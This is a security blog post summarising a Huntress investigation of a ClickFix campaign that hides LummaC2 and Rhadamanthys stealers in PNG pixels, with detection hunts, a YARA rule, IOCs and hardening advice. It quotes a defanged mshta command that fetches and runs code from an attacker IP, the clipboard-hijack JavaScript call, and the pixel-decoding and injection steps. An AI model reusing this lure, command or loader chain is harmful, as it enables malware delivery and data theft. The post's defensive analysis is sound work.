---
author: "Sab0x1D"
author_avatar: /assets/img/sab01xd-profile.jpeg
layout: listing
title: "ClickFix Gets Sneaky: Lumma & Rhadamanthys Hiding in PNG Pixels"
pretty_title: "ClickFix Gets Sneaky: Lumma & Rhadamanthys Hiding in PNG Pixels"
excerpt: "Notes on a fantastic Huntress write-up by Anna Pham and Ben Folland, walking through a ClickFix campaign where LummaC2 and Rhadamanthys are delivered via steganography inside PNG images."
thumb: /assets/img/huntress-clickfix.png
date: 2025-11-30
featured: true
tags: ["Malware", "ClickFix", "Steganography", "Threat Intel"]
---

> This post riffs off and heavily references the Huntress article  
> **“ClickFix Gets Creative: Malware Buried in Images”** by **Ben Folland** and **Anna Pham (RussianPanda)**. All the real heavy lifting is theirs – I’m just adding some commentary and defender-brain notes on top.

---

Original research and full technical details: Huntress — [ClickFix Gets Creative: Malware Buried in Images](https://www.huntress.com/blog/clickfix-malware-buried-in-images) by [Anna Pham / @RussianPanda9xx](https://x.com/RussianPanda9xx?s=20) and [Ben Folland / @polygonben](https://x.com/polygonben?s=20).

Every so often a vendor blog drops that makes you stop what you’re doing, grab a coffee and read it front to back.

I was going to use this Sunday slot for the usual **Weekly Threat Trends** post, but this ClickFix stego campaign is far more interesting than rehashing the same families again. So this week, the trends are taking a back seat to a proper deep dive instead.

For me this week, that was Huntress’ write-up:  
**“ClickFix Gets Creative: Malware Buried in Images”** – a deep dive into a **ClickFix campaign** delivering **LummaC2** and **Rhadamanthys** stealers via a multi-stage chain that ends with malware **encoded inside PNG pixels**, not just bolted onto the end of the file.

If you haven’t read their article yet, go do that first. Think of this as:

- My notes from reading it,
- A defender-friendly breakdown of the chain,
- Plus some detection / DFIR angles and user-awareness takeaways.

I’m not going to pretend this is original research, this is me standing on Anna and Ben’s shoulders and pointing at the cool bits.

---

## Quick refresher: What is ClickFix?

ClickFix isn’t a specific malware family – it’s a **social engineering technique**:

1. Victim lands on a web page (update prompt, “human verification”, fake support page, etc.).
2. The page quietly **copies a command into the clipboard** using JavaScript.
3. The user is told to press **Win+R**, hit **CTRL+V**, and then press **Enter**.
4. That command usually fires off a LOLBin like `mshta.exe` or `powershell.exe`, pulling in the actual malware from the internet.

No exploit. No macro. Just **user-assisted code execution** disguised as “fixing a problem”.

Huntress have been tracking ClickFix for a while (they even did a more general post, *“Don’t Sweat the *Fix Techniques”*). In this latest case, the technique is the same… but the **payload delivery** is much more interesting.

---

## The lures: “Verify you’re human” vs fake Windows Update

Huntress describe two main flavours of lure in this campaign.

### “Human Verification” page

The first is a pretty standard “Are you a robot?” style:

- A **“Human Verification” / robot check** page hosted on throwaway domains.
- On the page: instructions to press **Win+R** and then **CTRL+V**.
- Behind the scenes, the page uses JavaScript, with a chunk of the script stored encrypted and only decrypted at runtime.
- The decrypted JavaScript is injected via a **Blob URL**, and ultimately calls `navigator.clipboard.writeText()` with a full `mshta` command – something like:

```text
mshta hxxp://81.0x5a.29[.]64/ebc/rps.gz
```

The victim thinks they’re just doing a quick verification step. In reality, they’re running a remote script via `mshta.exe`.

### Full-screen fake Windows Update

The second lure is a lot nastier from a social-engineering point of view:

- A fake **Windows Update full-screen** page that mimics the blue update screen, including “Working on updates” animations.
- At the end of the “update”, the page tells the user something along the lines of:
  > “To complete the update, open the Run dialog (Win+R), paste the command and press Enter.”

This is clever because it feels like a normal OS workflow. Many users have been trained by IT or support to “press Win+R and paste this command”. ClickFix leans heavily on that muscle memory.

**User-awareness takeaway:**  
No legitimate Windows Update will ever ask you to **copy a command from a web page into Win+R**. If you see that, it’s not patching – it’s phishing.

---

## From clipboard to stealer: walking the chain

Let’s walk through the whole chain they documented, from the user’s paste to the final Lumma/Rhadamanthys payload.

### Stage 0 – Clipboard hijack

- The browser loads the ClickFix page.
- A chunk of JavaScript is stored in variables like `ENC` and `KEY_HEX`, decrypted via a rolling XOR, then wrapped into a `Blob` and executed via a `blob:` URL.
- Once running, that script calls:

```javascript
navigator.clipboard.writeText("mshta hxxp://81.0x5a.29[.]64/ebc/rps.gz");
```

- The user presses **Win+R**, hits **CTRL+V**, and presses Enter.
- We now get `explorer.exe → mshta.exe` with a URL pointing to attacker infrastructure, often with a **hex-encoded second octet** in the IP address (e.g. `0x5a` for `90`).

That hex trick is a neat little fingerprint for this cluster.

### Stage 1 – `mshta` pulls remote JScript

That `mshta` command hits the remote URL (e.g. `81.0x5a.29[.]64/ebc/rps.gz`), which:

- Returns **JScript** or HTML Application code.
- That script then pulls down and launches **PowerShell** – stage 2 of the chain – from attacker-controlled domains.

So your process tree is now:

```text
explorer.exe → mshta.exe → powershell.exe
```

### Stage 2 – PowerShell loader → .NET assembly

The PowerShell is, unsurprisingly, obfuscated:

- Various string encodings and junk instructions.
- Its real job is to **decrypt an embedded .NET assembly** and load it reflectively into memory.

This .NET assembly is the keystone of the campaign: it’s the **steganographic loader**.

### Stage 3 – .NET stego loader with 10k dummy methods

The .NET loader is not small. Huntress mention roughly:

- **10,000 dummy methods**, clearly there to drown the real logic in noise.
- Several AES-encrypted blobs inside:
  - A **configuration** object.
  - C# **injector source code**.
  - A **PNG image resource** that is actually where the final shellcode lives.

Once the AES keys/IVs are recovered (they’re in the config), the loader can:

1. Decrypt the PNG into memory.
2. Decrypt the injector source.
3. Start carving shellcode out of the image.

### Stage 4 – Steganography: shellcode in the red channel

This is the part that makes this campaign stand out.

Instead of just appending encrypted data after the PNG’s IEND chunk, the actor:

- Loads the PNG using `System.Drawing.Bitmap`.
- Locks the bitmap with `LockBits()` and gets direct access to the raw BGRA buffer.
- Iterates over each pixel, pulls the **red channel** value (R in BGRA).
- Uses a small decryption transform (for example, along the lines of `114 ^ (255 - redValue)`) to rebuild a shellcode byte stream.

Those decrypted bytes are stitched together into a shellcode buffer.

Why this matters:

- A lot of “stego” samples we see just glue their payload after the valid file data.  
  That’s trivial to spot with basic file structure checks.
- Here, the malicious content is **inside valid image pixels**, and the file will happily open as a normal image.
- Static tools that only check for “extra stuff after the image” will miss this completely.

The only way to see the shellcode is to either:

- Emulate / run the loader and watch memory, or
- Manually reverse the stego decoding logic and extract the payload yourself.

### Stage 5 – Dynamic C# compilation & process injection

Once the shellcode is extracted, the loader:

1. Decrypts C# **injector source code** (supplied in the config).
2. Compiles it at runtime into a .NET assembly.
3. Uses that assembly to inject shellcode into a target process – commonly `explorer.exe`.

Under the hood, it’s the classic Win32 dance:

```c
VirtualAllocEx
WriteProcessMemory
CreateRemoteThread
```

Nothing flashy, but combined with the stego stage it’s effective.

### Stage 6 – Donut shellcode → LummaC2 / Rhadamanthys

Finally, the shellcode itself is **Donut-packed**.

- Using tooling like `donut-decryptor`, Huntress were able to unpack it.
- The final payloads turned out to be commodity **infostealers**:
  - **LummaC2**
  - **Rhadamanthys** – even after Operation Endgame disruption, they saw infrastructure related to this campaign still alive in late November 2025 (though the final payload seemed to be missing at that point).

So, from the victim’s perspective:

> “I just pressed Win+R like the page told me to”  
>  
> → Meanwhile: a full stealer chain is running inside memory, with shellcode pulled out of what looks like a perfectly normal PNG.

---

## Infrastructure and IOCs (at a glance)

Huntress provide a really solid IOC section in their post. I’m not going to mirror the full table here – they’ll maintain that better than I can – but a couple of clusters stand out.

### ClickFix lure & loader infrastructure

- ClickFix lure domains:
  - `*.consent-verify.pages[.]dev`
  - Various randomised `.site` / `.com` domains.
- Loader / staging:
  - IPs like `81.90.29[.]64`, `141.98.80[.]175`, `94.74.164[.]136`.
  - Domains such as `corezea[.]com`, `securitysettings[.]live`, `xoiiasdpsdoasdpojas[.]com`.

You’ll want to feed these into whatever **blocklists / threat-intel platform** you maintain and tie them to a “ClickFix stego Lumma/Rhadamanthys” cluster for future correlation.

### Final C2s

The final C2s used by LummaC2 and Rhadamanthys shift frequently, but Huntress list several examples like `hypudyk[.]shop`, `squatje[.]su` and others.

Again, I’d treat their post as the canonical source and sync it into your environment rather than trying to keep a stale copy here.

---

## Detection & DFIR: how I’d hunt this

Here’s the part a lot of you will care about: **How do we spot this in the wild?**

I’ll keep this section high-level here, and I’ve got a more detailed version at the end that you can reuse as a standalone reference.

### Behavioural detections

Process chains to watch for:

- `explorer.exe → mshta.exe → powershell.exe` with:
  - `mshta.exe` launching with an HTTP/HTTPS URL argument.
  - PowerShell pulling from suspicious domains or plain IPs.

Look out for:

- URLs / commands where the **second octet of the IP is written in hex** (e.g. `81.0x5a.29[.]64`). That’s a nice little fingerprint.

If your EDR supports it, create rules for:

- **`mshta.exe` making outbound connections to the internet**, especially to non-internal IPs or newly observed domains.
- **`powershell.exe` spawned by `mshta.exe`**, with encoded commands or network activity.

### Run dialog & clipboard artefacts

Because the initial execution is user-driven via **Win+R**, there are useful artefacts on the host:

- **RunMRU** registry key:
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`
  - Look for entries containing `mshta`, suspicious URLs, or base64ed PowerShell.

If you’re lucky enough to have clipboard telemetry in your environment, exfil of `mshta hxxp://…` style strings from browser processes to the clipboard shortly before `mshta.exe` launches is a dead giveaway.

### .NET stego loader / image abuse

This is harder to generically detect, but some ideas:

- Hunt for unknown .NET assemblies that:
  - Import `System.Drawing` and specifically use `Bitmap.LockBits()` / `UnlockBits()`.
  - Immediately follow image processing with calls suggesting shellcode execution or process injection.

On the DFIR side:

- If you recover the loader binary, reverse the stego routine:
  - Extract the AES key/IV from the config.
  - Reproduce the pixel-walk + red-channel transform.
  - Rebuild the shellcode and run it in a controlled lab with something like `donut-decryptor` to unpack the final .NET payload.

### Policy & hardening

Some low-hanging fruit based on Huntress’ recommendations and my own experience:

- **Restrict or disable the Run dialog** for regular users:
  - Group Policy / registry: `NoRun` under `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`.
- **Constrain scripting LOLBins**:
  - Block or tightly control `mshta.exe`, `wscript.exe`, `cscript.exe` and un-constrained `powershell.exe` for non-admin users.
- Browser controls:
  - Filter / block known ClickFix domains.
  - Use DNS filtering to catch new ones quickly.

---


## YARA detection rule for the stego loader

Below is a heuristic YARA rule aimed at the **.NET steganographic loader** used in this ClickFix campaign.  
It does **not** try to match the Lumma or Rhadamanthys core binaries directly, instead it focuses on the stage that, regardless of the final payload, does the heavy lifting for this chain.  
In other words: this should still be useful even if the actor swaps Lumma/Rhadamanthys for a different infostealer in the future.

- Loads PNGs via `System.Drawing.Bitmap`,
- Uses `LockBits()` on 32bpp ARGB pixel data to reconstruct shellcode,
- And then injects that shellcode into another process (often `explorer.exe`).

```yara
// ---
// name: "ClickFix Stego Loader - LummaC2 / Rhadamanthys"
// family: "ClickFix"
// tags: ["stego","dotnet","loader","lumma","rhadamanthys"]
// author: "Sab0x1D"
// last_updated: "2025-11-30"
// tlp: "CLEAR"
// reference: "Huntress - ClickFix Gets Creative: Malware Buried in Images"
// ---

rule ClickFix_StegoLoader_Lumma_Rhadamanthys
{
  meta:
    description = "Heuristic detection of the ClickFix .NET stego loader that extracts shellcode from PNG pixels and injects into explorer.exe"
    author      = "Sab0x1D"
    date        = "2025-11-30"
    reference   = "https://www.huntress.com/blog/clickfix-malware-buried-in-images"
    tlp         = "CLEAR"
    malware_families = "LummaC2, Rhadamanthys"
    confidence  = "medium"

  strings:
    // .NET image-processing / stego-related strings
    $s_bitmap       = "System.Drawing.Bitmap" wide ascii
    $s_lockbits     = "LockBits" wide ascii
    $s_unlockbits   = "UnlockBits" wide ascii
    $s_pixelformat  = "PixelFormat.Format32bppArgb" wide ascii
    $s_bgra         = "Format32bppArgb" wide ascii

    // Common Win32 injection APIs
    $api_vaex       = "VirtualAllocEx" ascii
    $api_wpm        = "WriteProcessMemory" ascii
    $api_crt        = "CreateRemoteThread" ascii
    $api_op         = "OpenProcess" ascii

    // Explorer injection / process targeting hints
    $s_explorer     = "explorer.exe" wide ascii
    $s_inject       = "CreateRemoteThread in explorer" wide ascii nocase

    // AES / config hints
    $s_aes          = "System.Security.Cryptography.AesCryptoServiceProvider" wide ascii
    $s_rijndael     = "System.Security.Cryptography.RijndaelManaged" wide ascii
    $s_iv           = "IV" wide ascii
    $s_key          = "Key" wide ascii

  condition:
    // PE file
    uint16(0) == 0x5A4D and

    // Likely PE/.NET (simple heuristic PE signature check)
    for any i in (0..2) : (uint32(i*0x200 + 0x3C) < filesize and
                           uint32(uint32(i*0x200 + 0x3C)) == 0x00004550) and

    // Image processing + injection combo
    3 of ($s_bitmap, $s_lockbits, $s_unlockbits, $s_pixelformat, $s_bgra) and
    2 of ($api_vaex, $api_wpm, $api_crt, $api_op) and

    // Plus at least one extra hint to reduce FPs
    (1 of ($s_explorer, $s_inject) or 1 of ($s_aes, $s_rijndael, $s_iv, $s_key))
}
```

### How this rule works

Very briefly:

- The **strings** section looks for three things in the same PE file:
  - .NET image-processing behaviour (`System.Drawing.Bitmap`, `LockBits`, `PixelFormat.Format32bppArgb`),
  - Classic Win32 injection APIs (`VirtualAllocEx`, `WriteProcessMemory`, `CreateRemoteThread`, `OpenProcess`),
  - And either references to `explorer.exe` or AES crypto classes used to decrypt config / payload blobs.
- The **condition** then:
  - Restricts matches to PE files,
  - Requires a combination of image-processing + injection strings,
  - And insists on at least one extra hint (explorer targeting or AES config) to cut down noise.

It’s deliberately labelled as **confidence = "medium"** because it is heuristic and based on the behaviours described in the Huntress write-up, not on a full reverse of all possible variants.  
If you pull a real sample of this loader in your own lab, you can tighten this rule further by adding one or two unique method names or config keys from that binary.


## User awareness: updating the “never do this” script

This campaign is a nice case study to fold into security-awareness training.

For non-technical users, the message does *not* need to mention steganography or Donut shellcode. It’s as simple as:

- Never copy/paste commands from a website into **Win+R**, PowerShell or Command Prompt.
- If a website (even one that looks like Windows Update) asks you to **open Run and paste something**, stop and call IT.
- Windows updates **do not** run through your browser, and they definitely don’t require you to paste weird commands into the Run box.

This single rule kills a huge chunk of ClickFix-style campaigns.

---

## Final thoughts & big shout-out to Huntress

For me, this campaign ticks a lot of boxes:

- Same old social-engineering pattern (ClickFix),
- But with genuinely interesting payload tradecraft (stego in PNG pixels, dynamically compiled C# injector, Donut-packed stealers),
- All wrapped up in a really clear, high-signal write-up.

Massive kudos to **Anna Pham (RussianPanda)** and **Ben Folland** from Huntress for putting in the work to fully unravel this chain and share it with the community. Their original post has all the screenshots, JavaScript snippets and IOCs – go give it a read.

I’ll likely turn this into a **MalTrackDB family entry** and a small set of **YARA / Sigma ideas** for the stego loader and process chain – I’ll link those here once they’re cleaned up.

Until then:  
If a web page tells you to “press Win+R and paste this command” – you’re not updating Windows. You’re updating your threat actor’s C2 logs.

---

## Appendix: Detection & DFIR notes (copy-paste friendly)

### Behavioural detections (EDR / SIEM)

**Key process chains:**

- `explorer.exe → mshta.exe → powershell.exe → <child>`  
- `explorer.exe → mshta.exe` with:
  - Command line containing `http`/`https` URLs.
  - Plain-IP URLs where the **second octet is written in hex** (e.g. `81.0x5a.29[.]64`).

**Suggested rules / hunts:**

- Alert when `mshta.exe`:
  - Is spawned by `explorer.exe` or a browser process.
  - Has a command line containing `http://` or `https://` and no local `.hta`.
- Alert when `powershell.exe`:
  - Is spawned by `mshta.exe`.
  - Makes outbound connections to IP literals or low-reputation domains.

### Run dialog & clipboard artefacts (host triage)

Because the user manually runs the initial command:

- Check **RunMRU**:

  - Path: `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU`
  - Look for entries such as:
    - `mshta hxxp://81.0x5a.29[.]64/ebc/rps.gz`
    - Long PowerShell one-liners with base64/obfuscation.

- If clipboard telemetry is available:
  - Pivot on `navigator.clipboard.writeText` from browser logs (e.g. script injections).
  - Look for `mshta`/`powershell` style strings copied into the clipboard shortly before process execution.

### Stego loader & image abuse (reverse-engineering angle)

For reverse engineers looking at the loader:

- Flag .NET samples that:
  - Import `System.Drawing` and use `Bitmap.LockBits()` / `UnlockBits()`.
  - Access raw pixel buffers and iterate over BGRA bytes.
  - Immediately follow image processing with:
    - Shellcode-like memory buffers.
    - P/Invoke calls related to process injection.

**Extraction approach:**

1. Recover AES key/IV from the loader config.
2. Decrypt the PNG resource.
3. Emulate the pixel walk:
   - For each pixel, read the **red channel**.
   - Apply the same transform as the loader (e.g. `114 ^ (255 - R)`).
4. Dump the resulting buffer to disk and run it through:
   - `donut-decryptor` or equivalent, as the shellcode is Donut-packed.

### Network-side indicators

Even if payload hosting changes, some patterns are reusable:

- ClickFix lure pages with “Human Verification” themes.
- Loader / staging:
  - IPs and domains like `81.90.29[.]64`, `141.98.80[.]175`, `corezea[.]com`, `securitysettings[.]live`, etc.
- Final C2:
  - LummaC2 and Rhadamanthys domains listed in the original Huntress IOC section.

Prioritise:
- New domains resolving to already-seen ClickFix IPs.
- Connections from endpoints that show the `explorer → mshta → powershell` pattern.

### Hardening / prevention

Practical levers to reduce exposure:

- **Constrain Run dialog usage** for standard users:
  - Group Policy / registry: set `NoRun=1` under  
    `HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer`.
- **Application control:**
  - Block or restrict `mshta.exe`, `wscript.exe`, `cscript.exe`, and unconstrained `powershell.exe`.
- **Browser & DNS filtering:**
  - Block known ClickFix lure domains and monitor for similar patterns.
- **Awareness:**
  - Simple rule for staff: *“If a web page tells you to open Run (Win+R) and paste a command, stop and call IT.”*
